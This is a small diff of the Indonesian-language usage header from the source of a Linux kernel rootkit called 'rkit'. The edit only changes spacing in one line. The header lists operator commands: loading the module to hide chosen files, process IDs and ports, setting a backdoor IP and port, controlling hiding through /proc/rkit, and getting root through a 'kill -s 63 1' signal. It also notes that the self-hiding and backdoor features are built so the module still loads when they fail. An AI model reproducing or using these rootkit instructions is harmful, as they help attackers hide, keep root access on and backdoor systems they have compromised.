@@ -5,7 +5,7 @@
  *   insmod rkit.ko hide="pages.php,rahasia.txt" hidepid="123" \
  *                  hideport="8080,4444" backdoor_ip=10.0.0.5 backdoor_port=4444
  * Atau setelah load:  echo "hide pages.php" > /proc/rkit   (lihat ctl_proc.c)
- * LPE: kill -s63 1      |     unload: rmmod rkit
+ * LPE: kill -s 63 1     |     unload: rmmod rkit
  *
  * Fitur opsional (conn-hide, self-hide, backdoor) TIDAK menggagalkan load
  * bila bermasalah — cukup peringatan, agar selalu ada jalan keluar.
